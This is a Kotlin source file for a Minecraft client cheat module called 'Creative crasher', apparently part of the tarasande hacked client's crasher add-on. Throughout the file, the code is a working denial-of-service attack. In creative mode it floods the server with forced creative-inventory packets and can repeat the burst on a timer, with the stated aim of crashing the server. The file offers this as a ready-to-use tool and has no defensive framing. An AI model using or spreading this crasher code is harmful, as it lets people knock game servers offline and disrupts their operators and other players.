package su.mandora.tarasande_crasher.module

import net.minecraft.item.ItemStack
import net.minecraft.item.Items
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket
import su.mandora.tarasande.event.impl.EventDisconnect
import su.mandora.tarasande.event.impl.EventUpdate
import su.mandora.tarasande.mc
import su.mandora.tarasande.system.base.valuesystem.impl.ValueBoolean
import su.mandora.tarasande.system.base.valuesystem.impl.ValueNumber
import su.mandora.tarasande.system.feature.modulesystem.Module
import su.mandora.tarasande.util.math.TimeUtil
import su.mandora.tarasande_crasher.forcePacket

class ModuleCreativeCrasher : Module("Creative crasher", "Crashes the server by spamming items", "Crasher") {
    private val dummy = ItemStack(Items.STONE, 64)

    private val repeat = ValueBoolean(this, "Repeat", false)
    private val repeatDelay = ValueNumber(this, "Repeat delay", 500.0, 1000.0, 50000.0, 500.0, isEnabled = { repeat.value })

    private val timer = TimeUtil()

    init {
        registerEvent(EventDisconnect::class.java) {
            switchState()
        }
        registerEvent(EventUpdate::class.java) {
            if (repeat.value) {
                if (timer.hasReached(repeatDelay.value.toLong())) {
                    execute()
                    timer.reset()
                }
            }
        }
    }

    override fun onEnable() {
        super.onEnable()
        if (!repeat.value) execute()
    }

    private fun execute() {
        if (mc.player!!.abilities.creativeMode) {
            var j = 0.0
            while (j < 10.0) {

                forcePacket(CreativeInventoryActionC2SPacket((j % 9 + 1).toInt(), dummy))
                j++
            }
        }
    }
}
